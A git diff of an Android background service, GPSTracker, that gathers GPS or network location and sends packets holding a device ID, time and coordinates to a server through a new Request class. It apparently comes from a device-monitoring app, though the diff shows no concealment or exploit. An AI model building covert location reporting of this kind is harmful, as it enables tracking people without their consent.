@@ -3,7 +3,6 @@ package com.inet.android.location;
 import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
-import android.R.integer;
 import android.annotation.SuppressLint;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
@@ -12,23 +11,19 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
-import android.location.Criteria;
 import android.location.GpsStatus;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
 import android.os.Bundle;
 import android.os.IBinder;
-import android.os.PowerManager;
 import android.preference.PreferenceManager;
 import android.util.Log;
-import android.widget.Toast;
 
-import com.inet.android.bs.DataSendHandler;
 import com.inet.android.bs.FileLog;
 import com.inet.android.bs.MainActivity;
+import com.inet.android.bs.Request;
 import com.inet.android.bs.WorkTimeDefiner;
-import com.inet.android.history.LinkService;
 
 public class GPSTracker extends Service implements LocationListener {
 
@@ -52,6 +47,7 @@ public class GPSTracker extends Service implements LocationListener {
 	String nameId;
 	int minute;
 	private static final int SERVICE_REQUEST_CODE = 15;
+	Request req;
 	String provider;
 	// The minimum distance to change Updates in meters
 	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 0; // 100
@@ -143,26 +139,7 @@ public class GPSTracker extends Service implements LocationListener {
 				sendNoLoc();
 			} else {
 				this.canGetLocation = true;
-				if (isNetworkEnabled) {
-					locMetod = "network";
-					locationManager.requestLocationUpdates(
-							LocationManager.NETWORK_PROVIDER,
-							MIN_TIME_BW_UPDATES,
-							MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
-					Log.d("Network", "Network");
-					if (locationManager != null) {
-						location = locationManager
-								.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-						Log.d(TAG, "locationMannet != null ");
-
-						if (location != null) {
-							latitude = location.getLatitude();
-							longitude = location.getLongitude();
-							Log.d(TAG, "locationNet != null ");
-
-						}
-					}
-				}
+				
 				// if GPS Enabled get lat/long using GPS Services
 				if (isGPSEnabled) {
 					if (location == null) {
@@ -189,7 +166,9 @@ public class GPSTracker extends Service implements LocationListener {
 			}
 			if (Double.toString(latitude).equals("0.0")
 					&& Double.toString(longitude).equals("0.0")) {
-				sendNoLoc();
+				if (isNetworkEnabled) {
+					netLoc();
+				}
 			}
 			sendLoc();
 		} catch (Exception e) {
@@ -266,7 +245,26 @@ public class GPSTracker extends Service implements LocationListener {
 	//
 	// return location;
 	// }
+	public void netLoc(){
+		locMetod = "network";
+		locationManager.requestLocationUpdates(
+				LocationManager.NETWORK_PROVIDER,
+				MIN_TIME_BW_UPDATES,
+				MIN_DISTANCE_CHANGE_FOR_UPDATES, this);
+		Log.d("Network", "Network");
+		if (locationManager != null) {
+			location = locationManager
+					.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+			Log.d(TAG, "locationMannet != null ");
 
+			if (location != null) {
+				latitude = location.getLatitude();
+				longitude = location.getLongitude();
+				Log.d(TAG, "locationNet != null ");
+
+			}
+		}
+	}
 	public void sendLoc() {
 		sp = PreferenceManager.getDefaultSharedPreferences(this);
 		String sendStr = "<packet><id>" + sp.getString("ID", "ID")
@@ -274,8 +272,8 @@ public class GPSTracker extends Service implements LocationListener {
 				+ getLatitude() + " " + getLongitude() + "</app><ttl>"
 				+ locMetod + "</ttl></packet>";
 
-		DataSendHandler dSH = new DataSendHandler(getApplicationContext());
-		dSH.send(4, sendStr);
+		req = new Request(context);
+		req.sendRequest(sendStr);
 
 		Log.d(TAG, sendStr);
 		FileLog.writeLog("locationManager: " + sendStr);
@@ -290,8 +288,8 @@ public class GPSTracker extends Service implements LocationListener {
 				+ "</time><type>5</type><app>координаты неизвестны"
 				+ "</app><ttl>Определение местонахождение не поддерживается</ttl></packet>";
 
-		DataSendHandler dSH = new DataSendHandler();
-		dSH.send(4, sendStr);
+		req = new Request(context);
+		req.sendRequest(sendStr);
 
 		Log.d(TAG, sendStr);
 		FileLog.writeLog("locationManager: " + sendStr);
